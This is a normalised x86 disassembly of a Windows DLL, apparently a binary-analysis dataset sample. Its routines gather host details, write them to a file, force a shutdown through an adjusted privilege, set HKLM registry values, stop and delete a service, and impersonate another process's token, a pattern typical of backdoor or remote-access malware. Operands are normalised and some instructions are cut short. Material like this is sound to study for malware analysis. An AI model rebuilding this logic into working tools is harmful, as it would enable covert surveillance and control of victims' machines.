mov eax [ esp + 0xa4 ]
test ah 0x2
je r-xdata
push rw-data
jmp r-xdata
mov eax [ esp + 0x14 ]
cmp eax 0x2
jne r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push esi
call sub_10007930
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0xa4 ]
test al 0x80
je r-xdata
mov al [ esp + 0xa4 ]
test al 0x80
je r-xdata
test al 0x2
je r-xdata
push rw-data
jmp r-xdata
test al 0x2
je r-xdata
push rw-data
jmp r-xdata
cmp ax 0x400
jne r-xdata
push rw-data
jmp r-xdata
push rw-data
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
sub_10008240
sub esp 0x418
push esi
push edi
mov edi [ esp + 0x424 ]
push rw-data
push edi
call sub_10007930
add esp 0x8
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0x20 ]
mov esi 0x400
push eax
push ecx
mov [ esp + 0x10 ] esi
call [ GetComputerNameA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0x20 ]
push eax
push ecx
mov [ esp + 0x10 ] esi
call [ GetUserNameA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x20 ]
push edx
push rw-data
push edi
call sub_10007930
add esp 0xc
lea eax [ esp + 0x20 ]
push 0x105
push eax
call [ GetSystemDirectoryA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x20 ]
push edx
push rw-data
push edi
call sub_10007930
add esp 0xc
lea edx [ esp + 0x20 ]
push 0x105
push edx
call [ GetWindowsDirectoryA@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x20 ]
push ecx
push rw-data
push edi
call sub_10007930
add esp 0xc
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
lea eax [ esp + 0x20 ]
push eax
push rw-data
push edi
call sub_10007930
add esp 0xc
pop edi
pop esi
add esp 0x418
retn 0x4
push rw-data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push esi
call [ FreeLibrary@IAT ]
xor ecx ecx
lea edx [ esp + 0xc ]
mov [ esp + 0xc ] ecx
push edx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x10 ] 0x14
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] ecx
call eax
test eax eax
jl r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
push ecx
push edx
push rw-data
push edi
call sub_10007930
add esp 0x14
sub_10008380
sub esp 0x10
push ebx
push esi
push edi
call [ GetTickCount@IAT ]
mov ecx eax
mov eax 0x10624dd3
mul ecx
mov ecx edx
mov eax 0xc22e4507
shr ecx 0x6
mul ecx
mov edi edx
mov edx ecx
shr edi 0x10
lea eax [ edi + edi * 2 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea esi [ eax + eax * 8 ]
mov eax 0x91a2b3c5
shl esi 0x7
sub edx esi
mul edx
mov ebx edx
shr ebx 0xb
mov eax ebx
imul eax eax 0xe10
neg esi
sub esi eax
mov eax 0x88888889
lea edx [ esi + ecx ]
mul edx
shr edx 0x5
lea eax [ edx + edx * 2 ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
sub esi eax
add esi ecx
push esi
mov esi [ esp + 0x24 ]
push edx
push ebx
push edi
push rw-data
push esi
call sub_10007930
add esp 0x18
lea ecx [ esp + 0xc ]
push ecx
call [ GetLocalTime@IAT ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x16 ]
mov ecx [ esp + 0x14 ]
and edx 0xffff
and eax 0xffff
push edx
mov edx [ esp + 0x16 ]
and ecx 0xffff
push eax
mov eax [ esp + 0x16 ]
push ecx
mov ecx [ esp + 0x18 ]
and edx 0xffff
and eax 0xffff
push edx
and ecx 0xffff
push eax
push ecx
push rw-data
push esi
call sub_10007930
add esp 0x20
lea edx [ esp + 0xc ]
push edx
call [ GetSystemTime@IAT ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x16 ]
and eax 0xffff
and ecx 0xffff
push eax
push ecx
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x1a ]
mov ecx [ esp + 0x16 ]
and edx 0xffff
push edx
mov edx [ esp + 0x18 ]
and eax 0xffff
and ecx 0xffff
push eax
and edx 0xffff
push ecx
push edx
push rw-data
push esi
call sub_10007930
add esp 0x20
pop edi
pop esi
pop ebx
add esp 0x10
retn 0x4
sub_100084c0
sub esp 0x28
push esi
mov esi [ esp + 0x30 ]
push edi
push rw-data
push esi
call sub_10007930
mov ecx 0x8
xor eax eax
lea edi [ esp + 0x18 ]
add esp 0x8
[ edi ]
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x20
push eax
call [ GlobalMemoryStatus@IAT ]
mov ecx [ esp + 0x18 ]
mov [ esp + 0xc ] 0x0
shr ecx 0x14
mov [ esp + 0x8 ] ecx
sub esp 0x8
fild [ esp + 0x10 ]
fstp [ esp ]
call [ ceil@IAT ]
call _ftol
push eax
push rw-data
push esi
call sub_10007930
mov edx [ esp + 0x30 ]
shr edx 0xa
push edx
push rw-data
push esi
call sub_10007930
mov eax [ esp + 0x34 ]
push eax
push rw-data
push esi
call sub_10007930
add esp 0x2c
pop edi
pop esi
add esp 0x28
retn 0x4
sub_10008560
sub esp 0xa28
mov eax [ esp + 0xa2c ]
push ebx
push ebp
push esi
push edi
push rw-data
push eax
call sub_10007930
mov dl [ rw-data ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x541 ]
mov [ esp + 0x540 ] dl
mov [ esp + 0x40 ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x41 ]
mov [ esp + 0x640 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
mov ecx 0xff
lea edi [ esp + 0x141 ]
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x140 ] al
add esp 0x8
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xff
xor eax eax
lea edi [ esp + 0x639 ]
push 0x8003
[ edi ]
stosw [ edi ]
stosb [ edi ]
call [ SetErrorMode@IAT ]
mov ebx [ wsprintfA@IAT ]
mov ebp rw-data
lea edx [ esp + 0x138 ]
mov edi rw-data
jmp [ edx * 4 + jump_table_10008a14 ]
push ebp
call [ GetDriveTypeA@IAT ]
mov edx eax
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
lea esi [ esp + 0x138 ]
sub edi ecx
mov eax ecx
mov [ esp + 0x2c ] esi
mov esi edi
mov edi [ esp + 0x2c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
cmp edx 0x6
[ edi ] [ esi ]
ja r-xdata
push 0x0
call [ SetErrorMode@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xa28
retn 0x4
lea edx [ esp + 0x138 ]
mov edi rw-data
jmp r-xdata
mov [ esp + 0x138 ] 0x0
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x138 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x1c ]
lea edx [ esp + 0x34 ]
push ecx
push edx
push ebp
call [ GetDiskFreeSpaceExA@IAT ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x138 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x1c ]
lea edx [ esp + 0x34 ]
push ecx
push edx
push ebp
call [ GetDiskFreeSpaceExA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x138 ]
mov edi rw-data
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x138 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x1c ]
lea edx [ esp + 0x34 ]
push ecx
push edx
push ebp
call [ GetDiskFreeSpaceExA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x138 ]
mov edi rw-data
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0xa3c ]
lea eax [ esp + 0x138 ]
push eax
push ecx
call sub_10007930
add ebp 0x4
add esp 0x8
cmp ebp rw-data
jl r-xdata
lea eax [ esp + 0x38 ]
push 0x100
lea ecx [ esp + 0x24 ]
push eax
lea edx [ esp + 0x30 ]
push ecx
lea eax [ esp + 0x30 ]
push edx
push eax
lea ecx [ esp + 0x54c ]
push 0x100
push ecx
push ebp
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
lea eax [ esp + 0x38 ]
push 0x100
lea ecx [ esp + 0x24 ]
push eax
lea edx [ esp + 0x30 ]
push ecx
lea eax [ esp + 0x30 ]
push edx
push eax
lea ecx [ esp + 0x54c ]
push 0x100
push ecx
push ebp
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
mov ecx 0x14
call sub_1001d150
push edx
push eax
lea eax [ esp + 0x640 ]
push rw-data
push eax
call ebx
lea edi [ esp + 0x648 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x138 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x10 ]
mov ecx edx
mov edx [ esp + 0x14 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x14
call sub_1001d150
push edx
push eax
lea eax [ esp + 0x640 ]
push rw-data
push eax
call ebx
lea edi [ esp + 0x648 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x138 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
mov ecx 0x14
call sub_1001d150
push edx
push eax
lea eax [ esp + 0x640 ]
push rw-data
push eax
call ebx
lea edi [ esp + 0x648 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x138 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x10 ]
mov ecx edx
mov edx [ esp + 0x14 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x14
call sub_1001d150
push edx
push eax
lea eax [ esp + 0x640 ]
push rw-data
push eax
call ebx
lea edi [ esp + 0x648 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x138 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edx [ esp + 0x138 ]
mov edi rw-data
jmp r-xdata
lea edx [ esp + 0x38 ]
lea eax [ esp + 0x638 ]
push edx
push rw-data
push eax
call ebx
add esp 0xc
lea edi [ esp + 0x638 ]
lea edx [ esp + 0x138 ]
jmp r-xdata
lea edx [ esp + 0x38 ]
lea eax [ esp + 0x638 ]
push edx
push rw-data
push eax
call ebx
add esp 0xc
lea edi [ esp + 0x638 ]
lea edx [ esp + 0x138 ]
jmp r-xdata
sub_10008a30
push 0xffffffff
push sub_1006b22b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xcc
push ebx
push ebp
push esi
mov esi [ esp + 0xe8 ]
lea eax [ esp + 0x10 ]
push edi
push eax
mov ebp ecx
push esi
mov [ esp + 0x1c ] 0x104
call [ GetComputerNameA@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0xdc ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xd8
retn 0x4
mov ebx [ Sleep@IAT ]
lea edi [ esi + 0x214 ]
mov ebx 0x8
xor eax eax
mov ecx ebx
lea edi [ esp + 0x20 ]
[ edi ]
lea ecx [ esp + 0x20 ]
mov [ esp + 0x20 ] 0x20
push ecx
call [ GlobalMemoryStatus@IAT ]
mov edx [ esp + 0x28 ]
xor ebp ebp
shr edx 0x14
mov [ esp + 0x18 ] edx
mov [ esp + 0x1c ] ebp
fild [ esp + 0x18 ]
sub esp 0x8
fstp [ esp ]
call [ ceil@IAT ]
add esp 0x8
call _ftol
lea ecx [ esp + 0x10 ]
mov [ esi + 0x208 ] eax
call sub_10001700
mov eax [ esp + 0x10 ]
mov ecx 0x27
mov [ esi + 0x20c ] eax
xor eax eax
lea edi [ esp + 0x40 ]
[ edi ]
mov edi [ GetVersionExA@IAT ]
lea ecx [ esp + 0x40 ]
push ecx
mov [ esp + 0x44 ] 0x9c
call edi
cmp eax ebp
jne r-xdata
push 0x2710
call ebx
jmp r-xdata
mov eax [ esp + 0x50 ]
sub eax 0x2
je r-xdata
lea edx [ esp + 0x40 ]
mov [ esp + 0x40 ] 0x94
push edx
call edi
test eax eax
jne r-xdata
push edi
mov ecx ebp
call sub_10008df0
test eax eax
jne r-xdata
mov eax [ esp + 0x44 ]
cmp eax 0x6
jne r-xdata
mov [ esi + 0x210 ] ebx
jmp r-xdata
mov [ esi + 0x210 ] ebx
jmp r-xdata
cmp eax 0x5
jne r-xdata
mov [ esi + 0x210 ] ebp
jmp r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0xe4 ] 0xffffffff
call sub_10001750
mov eax 0x1
mov eax [ esp + 0x48 ]
cmp eax 0x2
jne r-xdata
cmp eax 0x1
jne r-xdata
mov [ esi + 0x210 ] 0x1
jmp r-xdata
cmp eax ebp
jne r-xdata
mov [ esi + 0x210 ] 0x2
jmp r-xdata
mov [ esi + 0x210 ] 0x3
sub_10008bd0
sub esp 0x104
push ebx
push ebp
push esi
mov ebp ecx
push 0x104
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
push edi
mov ecx 0x41
xor eax eax
mov edi ebx
[ edi ]
mov ecx 0x40
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] al
lea edx [ esp + 0x10 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push ebx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x14 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0x80
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push 0x1
push eax
and ecx 0x3
push 0x1
lea eax [ esp + 0x28 ]
push 0x40000000
push eax
[ edi ] [ esi ]
call sub_10002d60
add esp 0x20
mov esi eax
cmp esi 0xffffffff
pop edi
jne r-xdata
pop esi
pop ebp
pop ebx
add esp 0x104
retn
push esi
mov ecx ebp
call sub_10008380
push esi
mov ecx ebp
call sub_10008080
push esi
mov ecx ebp
call sub_10008240
push esi
mov ecx ebp
call sub_100084c0
push esi
mov ecx ebp
call sub_10008560
push esi
call [ CloseHandle@IAT ]
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x104
retn
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop esi
pop ebp
pop ebx
add esp 0x104
retn
sub_10008cf0
sub esp 0x14
lea eax [ esp ]
push eax
push 0x28
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x8 ]
push ecx
push rw-data
push 0x0
call [ LookupPrivilegeValueA@IAT ]
mov eax [ esp ]
push 0x0
push 0x0
lea edx [ esp + 0xc ]
push 0x0
push edx
push 0x0
push eax
mov [ esp + 0x1c ] 0x1
mov [ esp + 0x28 ] 0x2
call [ AdjustTokenPrivileges@IAT ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
add esp 0x14
retn 0x4
mov ecx [ esp + 0x18 ]
push 0x0
push ecx
call [ ExitWindowsEx@IAT ]
neg eax
sbb eax eax
neg eax
add esp 0x14
retn 0x4
xor eax eax
add esp 0x14
retn 0x4
sub_10008d80
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
xor eax eax
cpuid
mov [ ebp - 0x4 ] 0xffffffff
mov al 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10008df0
push ebp
mov ebp esp
sub esp 0x3a8
push ebx
push esi
push edi
mov ecx 0x10
xor eax eax
lea edi [ ebp - 0x50 ]
[ edi ]
mov ecx 0x3f
lea edi [ ebp - 0x150 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea ecx [ ebp - 0x50 ]
xor esi esi
lea eax [ ebp - 0x150 ]
push ecx
mov [ ebp - 0xc ] esi
mov [ ebp - 0x50 ] 0x37
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0xff
call Netbios
test al al
jne r-xdata
xor edi edi
push 0xa
push edi
push edi
lea ecx [ ebp - 0x4 ]
push edi
push ecx
push 0xc
push edi
push rw-data
call [ GetVolumeInformationA@IAT ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add esi ebx
mov [ ebp - 0x8 ] edi
adc edx edi
mov [ ebp - 0xc ] edx
call sub_10008d80
test al al
je r-xdata
mov al [ ebp - 0x150 ]
xor edi edi
test al al
jbe r-xdata
mov edx [ ebp + 0x8 ]
xor eax eax
add edi esi
mov esi [ ebp - 0xc ]
push 0xa
push edx
adc eax esi
push eax
push edi
call [ _ui64toa@IAT ]
add esp 0x10
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push ebx
push ecx
push edx
mov eax 0x1
cpuid
mov [ ebp - 0x8 ] eax
pop ecx
pop ebx
pop edx
mov edi [ ebp - 0x8 ]
mov ecx 0x10
xor eax eax
lea edi [ ebp - 0x50 ]
mov dl [ ebp - 0x14f ]
[ edi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov [ ebp - 0x20 ] dl
lea edx [ ebp - 0x46 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
mov [ ebp - 0x50 ] 0x33
lea edx [ ebp - 0x50 ]
[ edi ] [ esi ]
mov ecx eax
push edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x3a8 ]
mov [ ebp - 0x48 ] 0x258
mov [ ebp - 0x4c ] ecx
call Netbios
mov ax [ ebp - 0x3a4 ]
mov esi [ ebp - 0x3a8 ]
mov [ ebp - 0xc ] ax
mov bl 0x32
mov ecx [ ebp - 0x150 ]
inc edi
and ecx 0xff
cmp edi ecx
jl r-xdata
mov dl [ ebp + edi - 0x14f ]
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x50 ] bl
mov [ ebp - 0x20 ] dl
call Netbios
test al al
je r-xdata
test al al
jne r-xdata
sub_10008f50
push 0xffffffff
push sub_1006b248
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push esi
lea ecx [ esp + 0x4 ]
call sub_10004bb0
mov eax [ esp + 0x28 ]
mov [ esp + 0x1c ] 0x0
add eax 0xfffffffc
cmp eax 0x7
ja r-xdata
mov [ esp + 0xc ] r--data
jmp [ eax * 4 + jump_table_1000909c ]
call sub_100091e0
lea ecx [ esp + 0x4 ]
call sub_10008bd0
mov esi eax
call [ RevertToSelf@IAT ]
test esi esi
jne r-xdata
mov eax [ esp + 0x2c ]
lea ecx [ esp + 0x4 ]
mov eax [ eax ]
push eax
call sub_10008cf0
test eax eax
jne r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x2c ]
push eax
push ecx
call sub_100090c0
add esp 0x8
jmp r-xdata
call sub_10009170
jmp r-xdata
mov ecx [ esp + 0x2c ]
push ecx
call sub_100091d0
add esp 0x4
mov edx [ esp + 0x24 ]
lea ecx [ esp + 0x8 ]
push ecx
push edx
mov [ esp + 0x10 ] 0x3
mov [ esp + 0x18 ] esi
call sub_10003930
push esi
call sub_10002a70
push esi
call [ free@IAT ]
add esp 0x10
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x8 ] 0x1
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0xc ] eax
jmp r-xdata
cmp eax 0x1
je r-xdata
lea ecx [ esp + 0x4 ]
call sub_10001750
mov ecx [ esp + 0x14 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x1c
retn
mov eax [ esp + 0x24 ]
lea edx [ esp + 0x8 ]
push edx
mov [ esp + 0xc ] 0x1
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x8 ] 0x0
mov edx [ esp + 0x24 ]
lea ecx [ esp + 0x8 ]
push ecx
push edx
call sub_10003930
add esp 0x8
sub_100090c0
mov eax [ esp + 0x8 ]
push esi
cmp eax 0x8
push edi
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push eax
push 0x0
push 0x2
push 0x0
push 0x0
push 0x0
push rw-data
push 0x80000002
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov esi [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov edi [ RegSetValueExA@IAT ]
push 0x4
push esi
push 0x4
push 0x0
push rw-data
push ecx
call edi
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov eax [ esp + 0x10 ]
add esi 0x4
push 0x4
push esi
push 0x4
push 0x0
push rw-data
push eax
call edi
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
xor eax eax
pop esi
retn
mov edx [ esp + 0x10 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
mov eax 0x1
pop esi
retn
mov ecx [ esp + 0x10 ]
push ecx
call [ RegCloseKey@IAT ]
pop edi
xor eax eax
pop esi
retn
sub_10009170
sub esp 0x1c
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
add esp 0x1c
retn
push ebx
push esi
push 0xf003f
push rw-data
push edi
call [ OpenServiceA@IAT ]
mov ebx [ CloseServiceHandle@IAT ]
mov esi eax
test esi esi
je r-xdata
push edi
call ebx
pop esi
pop ebx
lea eax [ esp + 0xc ]
push eax
push 0x1
push esi
call [ ControlService@IAT ]
push esi
call [ DeleteService@IAT ]
push esi
call ebx
sub_100091e0
push ecx
push esi
push rw-data
call sub_10009240
add esp 0x4
push eax
push 0x0
push 0x1f0fff
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
pop esi
pop ecx
retn
lea eax [ esp + 0x4 ]
push eax
push 0xf01ff
push esi
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
push ecx
call [ ImpersonateLoggedOnUser@IAT ]
push esi
mov esi [ CloseHandle@IAT ]
call esi
mov edx [ esp + 0x4 ]
push edx
call esi
push esi
call [ CloseHandle@IAT ]
pop esi
pop ecx
retn
sub_10009240
sub esp 0x1ac
push ebx
push ebp
push esi
push edi
xor ebx ebx
mov ecx 0x49
xor eax eax
lea edi [ esp + 0x98 ]
mov [ esp + 0x94 ] ebx
push ebx
[ edi ]
push 0x2
call CreateToolhelp32Snapshot
mov esi eax
cmp esi 0xffffffff
mov [ esp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1ac
retn
lea eax [ esp + 0x94 ]
mov [ esp + 0x94 ] 0x128
push eax
push esi
call Process32First
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] bl
mov esi [ esp + 0x1c0 ]
mov ebp [ _stricmp@IAT ]
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0xb8 ]
push esi
push ecx
stosb [ edi ]
call ebp
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x9c ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1ac
retn
lea edx [ esp + 0xb8 ]
push 0x2e
push edx
call [ _mbsrchr@IAT ]
add esp 0x8
cmp eax ebx
je r-xdata
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x94 ]
push edx
push eax
call Process32Next
test eax eax
je r-xdata
lea ecx [ esp + 0xb8 ]
lea edx [ esp + 0xb8 ]
sub eax ecx
push eax
lea eax [ esp + 0x18 ]
push edx
push eax
call [ strncpy@IAT ]
lea ecx [ esp + 0x20 ]
push esi
push ecx
call ebp
add esp 0x14
test eax eax
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x15 ]
mov [ esp + 0x14 ] bl
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0xb8 ]
push esi
push ecx
stosb [ edi ]
call ebp
add esp 0x8
test eax eax
jne r-xdata
sub_100093bc
push ebp
mov ebp esp
sub esp 0x38
mov eax [ ebp + 0x10 ]
push ebx
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x8 ]
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x10 ] 0x0
mov [ ebp - 0x2c ] eax
mov eax [ esi ]
push 0x38
push rw-data
mov [ ebp - 0x28 ] eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x38 ]
push eax
call sub_10009a9d
add esp 0x10
test eax eax
jne r-xdata
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x38 ]
push 0x4
push eax
call sub_10009d4f
mov ebx eax
pop ecx
cmp ebx 0x1
pop ecx
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ esi ] eax
lea eax [ ebp - 0x38 ]
push eax
call sub_1000a567
pop ecx
lea eax [ ebp - 0x38 ]
push eax
call sub_1000a567
test ebx ebx
pop ecx
jne r-xdata
mov eax ebx
jmp r-xdata
push 0xfffffffb
pop eax
jmp r-xdata
sub_10009470
push ebp
mov ebp esp
sub esp 0x5c
or [ ebp - 0xc ] 0xffffffff
mov eax [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
lea ecx [ ebp - 0x5c ]
push esi
push edi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] eax
mov [ ebp + 0xc ] ecx
je r-xdata
xor eax eax
cmp eax ebx
je r-xdata
mov edi [ malloc@IAT ]
push 0x74
call edi
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
or [ esi + 0x6c ] 0xffffffff
push ebx
push ebx
push ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x44 ] ebx
mov [ esi ] ebx
mov [ esi + 0x48 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x40 ] ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x64 ] ebx
mov [ esi + 0x68 ] ebx
call sub_1000b339
push [ ebp + 0x8 ]
mov [ esi + 0x4c ] eax
mov [ esi + 0x50 ] ebx
mov [ esi + 0x58 ] ebx
call strlen
inc eax
push eax
call edi
add esp 0x14
cmp eax ebx
mov [ esi + 0x54 ] eax
je r-xdata
push esi
call sub_10009840
pop ecx
push [ ebp + 0x8 ]
push eax
call strcpy
pop ecx
mov [ esi + 0x5c ] bl
pop ecx
mov al [ ecx ]
cmp al 0x77
je r-xdata
mov [ esi + 0x5c ] 0x72
